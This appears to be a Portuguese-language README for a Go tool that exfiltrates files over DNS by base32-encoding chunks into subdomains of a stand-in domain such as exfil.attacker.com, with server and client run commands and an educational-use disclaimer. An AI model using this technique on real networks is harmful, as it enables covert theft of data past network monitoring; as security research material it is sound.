# dns-exfil-go

## Visão Geral do Projeto

Ferramenta escrita em Go para exfiltrar dados via requisições DNS, convertendo dados em base32 e enviando como subdomínios (ex: `SGVsbG8=.exfil.attacker.com`). O servidor Go atua como servidor DNS que escuta as requisições e reconstrói os dados recebidos.

## Estrutura do Projeto

```
dns-exfil-go/
├── server.go           # Servidor DNS que escuta os dados exfiltrados
├── client.go           # Simulador de cliente que envia dados via DNS
├── utils.go            # Funções auxiliares de encoding e chunking
└── README.md           # Documentação do projeto
```

## Como Funciona?

### Fluxo:

1. Dados são divididos em chunks.
2. Cada chunk vira um subdomínio codificado em base32.
3. É feita uma requisição DNS do tipo A: `SGVsbG8=.sessid.ordem.exfil.attacker.com`.
4. O servidor intercepta e reconstrói os dados com base no `sessid` e na `ordem`.

## Configuração e Uso

### Pré-requisitos

- Go (versão 1.16 ou superior)
- `github.com/miekg/dns` (será instalado automaticamente com `go mod tidy`)

### Servidor (server.go)

O servidor DNS escuta na porta `5353` (UDP) por requisições de exfiltração. Certifique-se de que esta porta não esteja em uso e que as regras de firewall permitam o tráfego UDP.

Para iniciar o servidor:

```bash
cd dns-exfil-go
go run server.go
```

### Cliente (client.go)

O cliente simula a exfiltração de um arquivo (`data.txt` por padrão). Ele lê o conteúdo do arquivo, divide em chunks, codifica em base32 e envia via requisições DNS para o servidor.

Para usar o cliente:

1. Crie um arquivo `data.txt` no mesmo diretório do `client.go` com os dados que deseja exfiltrar.
2. Execute o cliente:

```bash
go run client.go
```

**Observação:** O `DNSServer` e `BaseDomain` no `client.go` devem ser configurados para apontar para o IP e domínio do seu servidor de exfiltração.

## Aviso Ético

Esta ferramenta foi desenvolvida **APENAS PARA FINS EDUCACIONAIS E DE PESQUISA**. O uso indevido desta ferramenta para atividades ilegais ou não autorizadas é estritamente proibido e pode resultar em sérias consequências legais. Os desenvolvedores não se responsabilizam por qualquer uso indevido desta ferramenta.

Sempre obtenha permissão explícita antes de realizar qualquer tipo de teste de exfiltração de dados em sistemas ou redes que você não possui ou não tem autorização para testar.

## Licença

Este projeto está licenciado sob a licença MIT. Veja o arquivo `LICENSE` para mais detalhes. (A ser criado)


